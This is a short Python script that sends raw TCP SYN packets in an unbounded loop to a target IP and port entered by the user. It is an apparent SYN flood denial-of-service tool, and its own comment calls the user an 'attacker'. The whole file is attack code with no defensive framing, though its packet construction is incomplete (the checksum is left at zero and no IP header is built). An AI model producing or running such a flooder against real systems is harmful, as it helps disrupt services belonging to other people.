import socket
import struct
import sys

def create_syn_packet(destination_ip, destination_port, source_port=12345):
    # Create socket
    try:
        # Create raw socket (requires root/admin privileges)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except PermissionError:
        print("Error: This script requires root/admin privileges to create raw sockets")
        return False

    # TCP Header fields
    source = source_port  # Source Port
    dest = destination_port  # Destination Port
    seq = 0
    ack_seq = 0
    doff = 5
    
    # TCP Flags
    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = socket.htons(5840)  # Maximum window size
    check = 0
    urg_ptr = 0

    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)

    # TCP header
    tcp_header = struct.pack('!HHLLBBHHH',
        source,
        dest,
        seq,
        ack_seq,
        offset_res,
        tcp_flags,
        window,
        check,
        urg_ptr
    )

    try:
        # Send packet
        sock.sendto(tcp_header, (destination_ip, 0))
        print(f"SYN packet sent to {destination_ip}:{destination_port}")
        return True
    except Exception as e:
        print(f"Error sending packet: {e}")
        return False
    finally:
        sock.close()

if __name__ == "__main__":
    try:
        target_ip = input("Enter target IP address: ")
        target_port = int(input("Enter target port: "))
        while True:
            create_syn_packet(target_ip, target_port)
    # Allows attacker to stop the script by pressing Ctrl+C
    except KeyboardInterrupt:
        print("\nProgram terminated by user")
        sys.exit(0)
